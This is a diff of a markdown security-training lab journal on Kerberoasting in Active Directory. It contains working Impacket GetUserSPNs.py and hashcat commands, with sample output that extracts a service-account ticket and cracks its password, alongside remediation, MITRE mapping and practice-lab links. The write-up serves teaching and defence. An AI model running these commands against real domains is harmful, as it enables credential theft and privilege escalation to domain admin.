@@ -1,21 +1,19 @@
-**Author:** Bhavishya | **Version:** 1.0 | **Subject:** Network & AD Exploitation
-**Level:** 600 (Advanced / Red Team)
+🛡️ Day 41: Active Directory Privilege Escalation (Kerberoasting)
 
----
+Author: Bhavishya | Version: 1.0 | Subject: Network & AD Exploitation
+Level: 600 (Advanced / Red Team)
 
-## 🔬 Technical Deep Dive & Theory
+🔬 Technical Deep Dive & Theory
 
-Active Directory uses Kerberos for authentication. When a user wants to access a service (like an SQL server), they request a **Ticket Granting Service (TGS)** from the Domain Controller. 
+Active Directory uses Kerberos for authentication. When a user wants to access a service (like an SQL server), they request a Ticket Granting Service (TGS) from the Domain Controller.
 
-**The Cryptographic Flaw:**
-The Domain Controller encrypts this TGS ticket using the NTLM password hash of the *Service Account* running that specific service. Because any authenticated user in the domain can request a TGS for any Service Principal Name (SPN), an attacker can request these tickets, export them, and crack the encryption offline. If the service account has a weak password, the attacker recovers the plaintext password. Since Service Accounts often have excessive privileges (sometimes Domain Admin), this leads to full domain compromise.
+The Cryptographic Flaw:
+The Domain Controller encrypts this TGS ticket using the NTLM password hash of the Service Account running that specific service. Because any authenticated user in the domain can request a TGS for any Service Principal Name (SPN), an attacker can request these tickets, export them, and crack the encryption offline. If the service account has a weak password, the attacker recovers the plaintext password. Since Service Accounts often have excessive privileges (sometimes Domain Admin), this leads to full domain compromise.
 
----
+🗺️ Visualizing the Attack Chain
 
-## 🗺️ Visualizing the Attack Chain
+🕵️ The Logic Flow
 
-### 🕵️ The Logic Flow
-```text
 Phase 1: The Extraction (Stealthy)
 [ 👤 Attacker (Low Priv) ] --> Asks DC for SQL Service Ticket  --> [ 🏰 Domain Controller ]
 [ 🏰 Domain Controller ]   --> Encrypts ticket with SQL Hash   --> [ 👤 Attacker ]
@@ -25,18 +23,23 @@ Phase 2: The Crack (Offline)
 [ 📄 hashes.txt ]          --> Loaded into GPU / Hashcat       --> [ 💻 Attacker Host ]
 [ 💻 Attacker Host ]       --> Brute-forces RC4 encryption     --> [ 🔓 Plaintext Password ]
 
+
 💻 Lab: The "Dirty Hands" Execution
+
 🎯 Objective
+
 Leverage a low-privilege domain foothold to query the Domain Controller for vulnerable Service Principal Names (SPNs), extract the encrypted Kerberos ticket, and crack it offline using Hashcat.
 
 🧰 The Attack Tools
+
 Impacket (GetUserSPNs.py): To query AD and request the TGS.
 
 Hashcat: To crack the RC4 encrypted ticket (Mode: 13100).
 
 🩸 Raw Output & Logs (The Breach)
+
 1. Extracting the Hash from the DC:
-```
+
 ➜ GetUserSPNs.py target.local/bhavishya:Password123! -dc-ip 10.10.10.100 -request
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
 
@@ -47,6 +50,86 @@ MSSQLSvc/sql01.target.local:1433     svc_sql       CN=Domain Admins,CN=Users,DC=
 [*] Saving ticket in hashes.txt
 $krb5tgs$23$*svc_sql$TARGET.LOCAL$target.local/svc_sql*$6f8c...<TRUNCATED>...
 
-```
+
+2. Offline Cracking (The Local GPU):
+
+➜ hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force
+hashcat (v6.2.6) starting...
+
+$krb5tgs$23$*svc_sql$TARGET.LOCAL$target.local/svc_sql*$6f8c...:Summer2018!
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
 
 
+🛡️ RCA (Root Cause Analysis) & Defense-in-Depth
+
+Root Cause:
+Service accounts utilizing weak, human-generated passwords combined with legacy RC4 encryption (encryption type 23).
+
+Remediation Strategy:
+
+Implement gMSA (Group Managed Service Accounts): AD automatically rotates these passwords with complex, 120-character strings, making them mathematically impossible to crack offline.
+
+Enforce Strong Service Account Passwords: If gMSA cannot be used, passwords must be >25 random characters.
+
+Disable RC4 Encryption: Force Kerberos to use AES-256 (encryption type 18). Hashcat cracking speeds for AES-256 are drastically slower than RC4.
+
+🔍 Threat Actor Profiling & MITRE Mapping
+
+Threat Actor
+
+Motivation
+
+MITRE ATT&CK Technique
+
+APT29 (Cozy Bear)
+
+Lateral Movement
+
+T1558.003: Steal or Forge Kerberos Tickets: Kerberoasting
+
+Ransomware Cartels (LockBit)
+
+Domain Admin Escalation
+
+T1110.002: Brute Force: Password Cracking
+
+📊 GRC & Compliance Mapping
+
+NIST CSF (PR.AC-1 & PR.AC-4): Identity management and access control. Weak service account passwords directly violate identity governance.
+
+ISO 27001 (A.9.4.3): Password Management System. Mandates the rotation and complexity of system-to-system authentication credentials.
+
+CIS Controls (v8 - Control 5): Account Management. Specifically addresses the auditing and securing of service accounts.
+
+🛠️ Lab Report: What We Mastered
+
+Executive Summary: Focused on Active Directory privilege escalation today by executing a Kerberoasting attack. Leveraging the low-privilege foothold I secured yesterday, I used Impacket’s GetUserSPNs.py to query the Domain Controller and successfully extracted a vulnerable Service Principal Name (SPN) ticket ($krb5tgs$23$). I then moved the hash offline to my Arch machine and cracked it using Hashcat, completely bypassing AD account lockout policies. It was a stark reminder of how combining excessive permissions with stale, weak service account passwords can instantly hand an attacker the keys to the kingdom without triggering a single alarm.
+
+🚨 Real-World Breach Case Study: The APT29 Methodology
+
+During multiple high-profile breaches (including solar-winds related lateral movement), Russian state-sponsored actors (APT29) utilized Kerberoasting as a primary mechanism to escalate from a compromised phished user to Domain Admin. Because requesting TGS tickets is a standard, built-in feature of Active Directory, the initial extraction generates almost zero anomalous network traffic, allowing them to crack the passwords in their own labs and log back into the target network via VPN using the newly acquired Admin credentials.
+
+💡 Senior Researcher Insights & Future Trends
+
+Insight: "Kerberoasting is the silent killer of AD. It is not an exploit; it is abusing the protocol exactly how it was designed to work. Defending against it isn't about patching a vulnerability, it's about strict cryptographic hygiene."
+
+Future Trend (Targeted AS-REP Roasting): As defenders get better at monitoring SPN queries, attackers are pivoting to AS-REP Roasting (T1558.004), targeting user accounts that have "Do not require Kerberos preauthentication" enabled, which allows extraction of the TGT without even needing an initial foothold.
+
+Future Trend (Cloud SPNs): We are seeing similar token-extraction and offline brute-forcing methodologies migrating to improperly configured Azure AD (Entra ID) App Registrations and Service Principals.
+
+🎮 Gamified Labs & Simulation Training
+
+HackTheBox: "Active" (Classic AD Kerberoasting & GPP).
+
+TryHackMe: "Attacktive Directory" (Full AD exploit chain including Impacket usage).
+
+CyberSecLabs: "Roast" machine.
+
+🎁 Free Web Resources & Official Documentation
+
+Netwrix: What is Kerberoasting?
+
+PayloadsAllTheThings - Active Directory Kerberoasting
